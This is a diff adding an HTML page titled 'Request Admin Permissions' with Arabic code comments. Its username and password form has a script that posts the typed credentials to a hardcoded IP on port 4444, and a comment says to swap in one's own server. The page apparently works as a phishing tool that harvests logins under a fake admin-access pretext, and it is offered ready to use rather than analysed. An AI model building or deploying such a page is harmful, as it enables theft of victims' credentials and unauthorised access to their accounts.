@@ -1,0 +1,57 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Request Admin Permissions</title>
+</head>
+<body>
+    <h2>Request Admin Permissions</h2>
+    <form id="adminForm">
+        <label for="username">Username:</label>
+        <input type="text" id="username" name="username" required><br><br>
+        <label for="password">Password:</label>
+        <input type="password" id="password" name="password" required><br><br>
+        <button type="submit">Submit</button>
+    </form>
+
+    <script>
+        document.getElementById("adminForm").addEventListener("submit", function(event) {
+            event.preventDefault(); // منع السلوك الافتراضي للنموذج
+
+            const formData = new FormData(this);
+
+            // استرجاع بيانات المستخدم من النموذج
+            const username = formData.get('username');
+            const password = formData.get('password');
+
+            // قم بتغيير العنوان IP والبورت بمعلومات الخادم الخاص بك
+            const serverIP = '192.168.0.102';
+            const port = '4444';
+
+            // إرسال البيانات إلى الخادم عبر طلب POST
+            fetch(`http://${serverIP}:${port}/admin/login`, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json'
+                },
+                body: JSON.stringify({ username, password })
+            })
+            .then(response => {
+                if (!response.ok) {
+                    throw new Error('Failed to send data to server.');
+                }
+                return response.text();
+            })
+            .then(data => {
+                alert('Data sent successfully: ' + data);
+                // هنا يمكنك إدراج سلوك إضافي بعد إرسال البيانات بنجاح
+            })
+            .catch(error => {
+                console.error('Error:', error);
+                alert('An error occurred while sending data to server.');
+            });
+        });
+    </script>
+</body>
+</html>
